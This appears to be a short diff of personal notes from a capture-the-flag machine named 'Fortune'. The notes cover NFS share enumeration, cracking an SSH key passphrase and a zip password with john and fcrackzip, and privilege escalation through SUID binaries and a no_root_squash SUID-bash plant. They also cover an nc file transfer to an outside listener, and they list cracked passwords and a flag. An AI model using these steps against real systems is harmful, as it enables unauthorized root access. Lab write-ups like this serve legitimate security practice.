@@ -1,0 +1,55 @@
+Fortune:
+21
+22
+kairos has priv ssh key
+hermes
+use priv ssh key from NFS share to login
+asks for passphrase
+cracked with john and ssh2john
+147852 is passphrase
+80
+111
+2049
+nfs share, /srv/nfs is public
+sudo mount -t nfs 10.10.169.215:/srv/nfs /mnt -o nolock
+cd /mnt; cat *
+found a private key, looks to be encrypted with an alphabet cipher
+vignette cipher key = n
+file is named hermes_ssh, user is hermes?
+3333
+gives base64 data
+put into cyberchef, its a zip file
+appears to have a password protection of some sort
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt application.zip
+password may change, but rn it is punkrock
+fortuna:YzNhOGU2OD’
+40303
+44981
+51295
+59637
+priv esc
+/usr/bin/xargs
+xargs -a /dev/null sh -p
+/usr/bin/nice
+nice /bin/sh -p
+/usr/bin/find
+/srv/nfs (no_root_squash)
+ON KALI MACHINE (in nfs share)
+sudo cp /bin/bash .
+sudo chown root:root bash
+sudo chmod +s bash
+fortuna
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+found /home/lucky_shell
+transferred to kali
+cat lucky_shell | nc 10.6.97.245 4444
+nc -lvp 4444 > lucky_shell
+after analysis, there are 3 options for what the shell will do
+boot you out
+say “unlucky”
+give you root shell
+Technically, you can just spam until u get root…
+use ssh_auth to speed this process up a bit
+flags
+/srv/blackjack
+5a0ea72f9dbcf6f874bed9e4fa4f1f2a
